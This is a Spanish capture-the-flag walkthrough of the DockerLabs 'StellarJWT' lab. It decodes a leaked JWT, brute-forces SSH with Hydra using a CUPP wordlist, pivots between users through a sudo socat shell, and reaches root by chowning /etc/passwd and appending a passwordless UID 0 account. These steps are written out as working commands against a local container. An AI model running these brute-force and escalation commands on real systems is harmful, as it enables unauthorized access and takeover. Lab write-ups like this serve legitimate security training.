---
title: "DockerLabs - StellarJWT"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar la manipulación de tokens JWT, fuerza bruta SSH y escalada de privilegios mediante movimiento entre usuarios.

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH 9.6p1 Ubuntu)
- **80/tcp** — HTTP (Apache 2.4.58 Ubuntu) — título "NASA Hackeada"

## Enumeración Web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -x php,html,txt,js -t 30
```

Encontramos el directorio `/universe` (301). Dentro aparece un token **JWT**:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6Im5lcHR1bm8iLCJpYXQiOjE1MTYyMzkwMjJ9.t-UG_wEbJdc_t0spVGKkNaoVaOeNnQwzvQOfq0G3PcE
```

Un JWT se compone de tres partes separadas por puntos (`header.payload.signature`). Decodificamos la parte central (payload) en Base64:

```bash
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6Im5lcHR1bm8iLCJpYXQiOjE1MTYyMzkwMjJ9" | base64 --decode
# {"sub":"1234567890","user":"neptuno","iat":1516239022}
```

**Usuario potencial: `neptuno`**

### Pregunta de seguridad — descubridor de Neptuno

En `http://172.17.0.2` se plantea una pregunta: quién fue el primer astrónomo alemán en descubrir Neptuno. La respuesta es **Johann Gottfried Galle**.

### Generación de diccionario — CUPP

Con el nombre del astrónomo generamos un diccionario de contraseñas personalizado para intentar averiguar la contraseña de `neptuno`:

```bash
python3 cupp.py -i
```

Se rellena el perfil interactivo de CUPP con los datos de Johann Gottfried Galle para que combine nombre, apellidos y variantes en las contraseñas candidatas.

## Explotación — Fuerza bruta SSH

Con el diccionario generado por CUPP, lanzamos Hydra contra el servicio SSH usando el usuario `neptuno`:

```bash
hydra -l neptuno -P /home/sreaper/ALMACEN/HACKING/TOOLS/cupp/johann.txt ssh://172.17.0.2 -t 16
```

**Credenciales encontradas:** `neptuno:Gottfried`

```bash
ssh neptuno@172.17.0.2
# password: Gottfried
```

## Movimiento lateral — neptuno → nasa

Dentro del directorio personal de `neptuno` encontramos un fichero oculto:

```bash
ls -la
cat .carta_a_la_NASA.txt
```

```
Buenos días, quiero entrar en la NASA. Ya respondí las preguntas que me hicieron. Se las respondo de nuevo por aquí.

¿Qué significan las siglas NASA? -> National Aeronautics and Space Administration
¿En que año se fundó la NASA? -> 1958
¿Quién fundó la NASA? -> Eisenhower

Por favor, necesito entrar!!
```

Revisando `/home` aparece un usuario `nasa`:

```bash
ls -la /home
```

Usamos la respuesta a la última pregunta como contraseña para pivotar:

```bash
su nasa
# password: Eisenhower
```

**Acceso conseguido como `nasa`.**

## Movimiento lateral — nasa → elite

Comprobamos permisos sudo:

```bash
sudo -l
```

`nasa` puede ejecutar `socat` como el usuario `elite`. Usamos la técnica de [GTFOBins](https://gtfobins.github.io/gtfobins/socat/#sudo) para obtener una shell interactiva:

```bash
sudo -u elite socat - 'exec:/bin/bash -p,pty,ctty,raw,echo=0'
```

**Acceso conseguido como `elite`.**

## Escalada de privilegios

Comprobamos permisos sudo:

```bash
sudo -l
```

`elite` puede ejecutar `chown` como root. Cambiamos el propietario de `/etc/passwd` para poder editarlo directamente:

```bash
sudo chown elite:elite /etc/passwd
```

Añadimos un nuevo usuario con UID/GID 0 (root) y sin contraseña:

```bash
echo 'user::0:0:,,,:/root:/bin/bash' >> /etc/passwd
```

Cambiamos a ese usuario y confirmamos el acceso:

```bash
su user
whoami
# root
```

**Root conseguido.** ✓

## Conclusión

La máquina encadena la manipulación de un JWT filtrado en `/universe` para identificar al usuario `neptuno`, una pregunta de trivia web sobre el descubridor de Neptuno usada para generar un diccionario a medida con CUPP y crackear su contraseña por fuerza bruta, y dos pivotes sucesivos de usuario (a `nasa` mediante otra pregunta de seguridad hallada en un fichero oculto, y a `elite` abusando de `sudo socat`) hasta llegar a root explotando un permiso `sudo chown` sobre `/etc/passwd`.
